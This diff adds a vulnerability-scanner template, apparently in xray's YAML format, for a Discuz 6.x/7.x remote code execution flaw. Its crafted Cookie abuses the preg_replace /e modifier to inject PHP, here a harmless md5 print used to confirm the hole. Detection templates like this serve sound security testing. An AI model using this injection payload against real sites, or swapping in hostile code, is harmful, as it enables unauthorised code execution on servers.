@@ -1,0 +1,17 @@
+name: poc-yaml-discuz-wooyun-2010-080723
+set:
+  rand: randomInt(200000000, 210000000)
+rules:
+  - method: GET
+    path: >-
+      /viewthread.php?tid=10
+    headers:
+      Cookie: GLOBALS%5B_DCACHE%5D%5Bsmilies%5D%5Bsearcharray%5D=/.*/eui; GLOBALS%5B_DCACHE%5D%5Bsmilies%5D%5Breplacearray%5D=print_r(md5({{rand}}));
+    follow_redirects: false
+    expression: |
+      response.status == 200 && response.body.bcontains(bytes(md5(string(rand))))
+detail:
+  version: Discuz 7.x/6.x
+  author: Loneyer
+  links:
+    - https://github.com/vulhub/vulhub/tree/master/discuz/wooyun-2010-080723
